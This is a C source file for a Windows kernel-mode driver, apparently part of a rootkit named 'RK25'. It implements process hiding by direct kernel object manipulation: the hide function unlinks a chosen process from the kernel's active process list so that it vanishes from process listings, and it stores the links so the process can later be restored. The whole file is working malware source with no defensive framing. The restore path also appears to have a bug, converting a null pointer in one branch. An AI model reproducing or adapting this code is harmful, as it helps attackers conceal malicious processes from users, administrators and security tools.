#pragma once
#include "rk25_dkom_process.h"

#define RK25_PROLOG_DKOM "DROM Dispatcher"

PRK25_LC glLCDKOMProcess;
KSPIN_LOCK glSpinLock;

VOID RK25DKOMProcessInit() {
	glLCDKOMProcess = RK25ListInit(sizeof(RK25_DKOM_PD));
	KeInitializeSpinLock(&glSpinLock);
}

VOID RK25WriteProcessName(PEPROCESS proc, PRK25_DKOM_PD data) {
	if (!proc || !data) return;
	PUNICODE_STRING unic;
	if (NT_SUCCESS(SeLocateProcessImageName(proc, &unic))) {
		USHORT index = unic->Length / sizeof(WCHAR);
		while (index > 0) {
			if (unic->Buffer[index - 1] == L'\\') {
				break;
			}
			index--;
		}
		data->name.Buffer = (PCWSTR)ExAllocatePoolWithTag(NonPagedPool, unic->MaximumLength - (index * sizeof(WCHAR)), 'MNRP');
		if (data->name.Buffer) {
			RtlCopyMemory(data->name.Buffer, unic->Buffer + index, unic->MaximumLength - (index * sizeof(WCHAR)));
			data->name.Length = unic->Length - (index * sizeof(WCHAR));
			data->name.MaximumLength = unic->MaximumLength - (index * sizeof(WCHAR));

			RK25_DBG_INFO_F(RK25_PROLOG_DKOM, "Process name: %wZ", data->name);
		}
		RtlFreeUnicodeString(unic);
	}
}

NTSTATUS RK25DKOMProcessUnhideData(PRK25_DKOM_PD data) {
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS procNext = NULL, procPrev = NULL;
	PLIST_ENTRY entry = NULL;
	USHORT offset = RK25GetOffsetToAPL();
	PLIST_ENTRY apl = RK25GetActiveProcessHead();
	if (!data) return STATUS_UNSUCCESSFUL;

	if (RK25IsValidListEntry(data->saveLinks)) {
		KIRQL oldIrql;
		KeAcquireSpinLock(&glSpinLock, &oldIrql);

		/*
		* @ref: https://asciiflow.com
		*     ┌──────────────────────┐                                                         
		*     │                      ▼                                                         
		*     │                   ┌───────────────┐                                            
		*     │                 ┌►│  newProcLink  │                                            
		*     │                 │ │───────────────│                                            
		*     │                 │ │ BLink │ FLink │                                        
		*     │                 │ └┬─────────────┬┘                                         
		*     │───/─────/────┐  └──┼──┐          │   ┌───────────────────────────────────┐     
		*	  │              ▼     ▼  │          ▼   ▼                                   │     
		*     │      ┌───────────────┐│      ┌───────────────┐      ┌───────────────┐    │     
		*     │      │procLink->BLink││  ┌/─►│   procLink    │  ┌──►│procLink->FLink│    │     
		*     │      │───────────────││  │   │───────────────│  │   │───────────────│    │     
		* ◄───┼──────┼ BLink │ FLink ┼┘─/┘   │ BLink │ FLink ┼──┘   │ BLink │ FLink ┼────┼───► 
		*	  │      └───────────────┘       └───┬───────────┘      └───┬───────────┘    │     
		*	  │                                  │                      │                │     
		*	  └──────────────────────────────────┘                      └────────────────┘     
		*/
		procNext = RK25SearchEProcByAPL((PLIST_ENTRY)data->saveLinks->Flink);
		if (procNext) { // if next process is exsits
			entry = RK25_EPROC_TO_APL(procNext, offset);
			entry->Blink->Flink = data->saveLinks;
			if (entry->Blink != data->saveLinks->Blink) {
				data->saveLinks->Blink = entry->Blink;
			}
			entry->Blink = data->saveLinks;
		}
		else {
			procPrev = RK25SearchEProcByAPL((PLIST_ENTRY)data->saveLinks->Blink);
			if (procPrev) { // if only prev process is exsits and 
				entry = RK25_EPROC_TO_APL(procNext, offset);
				entry->Flink->Blink = data->saveLinks;
				data->saveLinks->Flink = entry->Flink;
				entry->Flink = data->saveLinks;
			}
			else if (RK25IsValidListEntry(apl)) { // add to last if prev and next processes are already terminated
				data->saveLinks->Flink = apl;
				data->saveLinks->Blink = apl->Blink;
				apl->Blink->Flink = data->saveLinks;
				apl->Blink = data->saveLinks;
			}
			else status = STATUS_UNSUCCESSFUL;
		}
		KeReleaseSpinLock(&glSpinLock, oldIrql);
		if (NT_SUCCESS(status)) {
			if (data->name.Buffer) {
				ExFreePool((PVOID)data->name.Buffer);
				data->name.Buffer = NULL;
				data->name.Length = data->name.MaximumLength = 0;
			}
			RK25ListEntryDel(glLCDKOMProcess, data);
		}
	}
	return status;
}

VOID RK25DKOMProcessFree() {
	PRK25_DKOM_PD entry;
	do {
		entry = (PRK25_DKOM_PD)RK25ListEntryNext(glLCDKOMProcess);
		if (entry) RK25DKOMProcessUnhideData(entry);
	} while (entry != NULL);
	RK25ListFree(glLCDKOMProcess);
}

NTSTATUS RK25DKOMProcessUnhide(HANDLE pid) {
	PRK25_DKOM_PD data = RK25DKOMProcessGetByPID(pid);
	if (!data) {
		RK25_DBG_ERR_F(RK25_PROLOG_DKOM, "PID %d is not found", (ULONG_PTR)pid);
		return STATUS_NOT_FOUND;
	}
	return RK25DKOMProcessUnhideData(data);
}

NTSTATUS RK25DKOMProcessHide(HANDLE pid) {
	NTSTATUS status = STATUS_SUCCESS;
	RK25_DKOM_PD data = { 0 };
	PLIST_ENTRY linkProc = NULL;
	USHORT offset = RK25GetOffsetToAPL();
	PEPROCESS proc = RK25SearchEProcByPID(pid);
	if (!proc) return STATUS_NOT_FOUND;

	linkProc = RK25_EPROC_TO_APL(proc, offset);

	KIRQL oldIrql;
	KeAcquireSpinLock(&glSpinLock, &oldIrql);

	linkProc->Blink->Flink = linkProc->Flink;
	linkProc->Flink->Blink = linkProc->Blink;

	KeReleaseSpinLock(&glSpinLock, oldIrql);

	data.pid = pid;
	data.saveLinks = linkProc;
	RK25WriteProcessName(proc, &data);
	if (!RK25ListAdd(glLCDKOMProcess, &data)) {
		RK25DKOMProcessUnhide(pid);
		status = STATUS_UNSUCCESSFUL;
	}

	return status;
}

PRK25_DKOM_PD RK25DKOMProcessGet(PVOID target, UCHAR attr) {
	PRK25_DKOM_PD entry;
	do {
		entry = (PRK25_DKOM_PD)RK25ListEntryNext(glLCDKOMProcess);
		if (entry)
			if (attr & RK25_PROC_PID) {
				if (entry->pid == (HANDLE)target)
					break;
			}
			else if (attr & RK25_PROC_NAME) {
				if (!entry->name.Buffer) continue;
				if (RtlEqualUnicodeString(&entry->name, (PUNICODE_STRING)target, TRUE))
					break;
			}
			
	} while (entry != NULL);
	RK25ListFlush(glLCDKOMProcess);
	return entry;
}

PRK25_DKOM_PD RK25DKOMProcessGetByPID(HANDLE pid) {
	return RK25DKOMProcessGet((PVOID)pid, RK25_PROC_PID);
}

PRK25_DKOM_PD RK25DKOMProcessGetByName(PUNICODE_STRING name) {
	return RK25DKOMProcessGet((PVOID)name, RK25_PROC_NAME);
}

VOID RK25DKOMProcessRestore(HANDLE pid) {
	if (NT_SUCCESS(RK25DKOMProcessUnhide(pid))) {
		RK25ListEntryDel(glLCDKOMProcess, (PVOID)RK25DKOMProcessGetByPID(pid));
	}
}

